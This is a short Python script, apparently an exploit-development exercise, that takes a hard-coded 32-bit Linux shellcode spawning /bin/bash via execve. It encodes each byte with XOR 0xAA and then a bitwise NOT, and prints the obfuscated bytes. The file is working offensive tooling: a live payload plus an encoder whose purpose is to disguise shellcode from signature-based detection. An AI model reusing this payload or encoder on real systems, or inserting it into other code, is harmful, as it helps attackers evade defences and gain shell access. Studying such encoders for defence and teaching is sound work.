#!/usr/bin/python3
# Python XOR and NOT encoder

# The shellcode used is a basic systemcall to execve
shellcode = b"\x31\xdb\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
encoded_shellcode = ""

print('Shellcode len: {}'.format(len(shellcode)))
print('Encoded shellcode ...')

# Encode the shellcode in two steps (A XOR then a NOT):
for x in bytearray(shellcode):
	# XOR encoder part
	# 0xAA is the Byte used to encode
	y = x ^ 0xAA

	# NOT encoder part
	y = ~y
	encoded_shellcode += '{},'.format(hex(y & 0xFF))

# Print an encoded shellcode format
print(encoded_shellcode)


